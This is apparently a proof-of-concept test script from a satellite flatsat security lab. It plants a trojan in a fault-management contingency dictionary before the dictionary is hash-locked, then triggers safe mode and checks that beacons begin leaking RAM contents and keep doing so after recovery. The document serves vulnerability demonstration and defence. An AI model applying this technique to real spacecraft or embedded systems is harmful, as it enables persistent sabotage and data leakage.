#!/usr/bin/env python3
# SPDX-License-Identifier: GPL-2.0-or-later
import os, sys, struct
sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), "lib"))
import fslab
from fslab import check
import flatsat_sim as fs


# V-20  FDIR contingency dictionary: flash entries 'apid+payload' executed
# ON SAFE-MODE ENTRY. Writable by TC before the lock -> the embedded
# equivalent of the OPS-SAT 'executable.jar'. Hash lock closes it later.
# SPARTA: PE-0002.01 / PR-0003 (trojan in contingency plan)
def main(dev, ev):
    # readback of an existing entry (default: thruster stop / beacon 10 s)
    r = dev.find(dev.tc(0x1D, bytes([6, 0]), via="usb"), 0x1D)[0]
    ev.log(f"entry0: apid=0x{(r.u8(2)<<8|r.u8(3)):02X} payload={r.payload[5:].hex()}")

    # plant a trojan: on any safe-mode entry, switch padding to leak mode
    trojan = bytes([5, 2]) + struct.pack(">H", 0x0021) + bytes([1, 0x01])
    r = dev.find(dev.tc(0x1D, trojan, via="usb"), 0x1D)[0]
    check(r.u8(3) == 1, "trojan accepted while dictionary unlocked")
    ev.log("entry2 := APID 0x21 (PADDING_CONFIG) payload 01 -> leak padding")

    # lock it: dictionary hash computed, further writes refused
    lk = dev.find(dev.tc(0x1D, bytes([7]), via="usb"), 0x1D)[0]
    ev.log(f"lock hash={lk.payload[3:11].hex()} locked={lk.u8(11)}")
    check(lk.u8(11) == 1, "dictionary hash locked")
    tam = dev.find(dev.tc(0x1D, bytes([5, 2]) + struct.pack(">H", 0x0004)
                         + bytes([1, 0]), via="usb"), 0x1D)[0]
    check(tam.u8(3) == 0, "tamper after lock refused (ok=0)")

    # trigger safe mode -> dictionary executes -> padding mode flipped
    dev.tc(0x1D, bytes([2]), via="radio")            # remote safe entry
    check(dev.sim.pad_mode == 1, "contingency executable ran on safe entry")
    dev.tc(0x05, b"\x01", via="usb")
    # 3000 ms window: on the board the first beacon after a rate change
    # lands ~1.5 s late and the advance window's leading read latency eats
    # ~1-2 s of a 1500 ms window (the sim fires its first post-change
    # beacon at the nominal 1 s tick, so 1500 ms is never a problem there).
    bc = [t for t in dev.find(dev.advance(3000), 0x01)
          if t.payload[1:7] == b"Beacon"]
    ev.log(f"after safe entry beacon padding mode=1 -> "
           f"{bc[0].payload[21:29].hex()}... (RAM leak active)")
    # and it PERSISTS after safe-mode exit: permanent behavior change
    dev.advance(122000)                              # ride out 120 s window
    dev.tc(0x1D, bytes([3]), via="usb")
    st = dev.find(dev.tc(0x0C, b"", via="usb"), 0x0C)[0]
    check(st.u8(1) == 1, "back to NOMINAL")
    check(dev.sim.pad_mode == 1, "trojan effect outlived safe mode")

if __name__ == "__main__":
    sys.exit(fslab.run_poc(__file__, "V-20 FDIR contingency dictionary trojan", main))
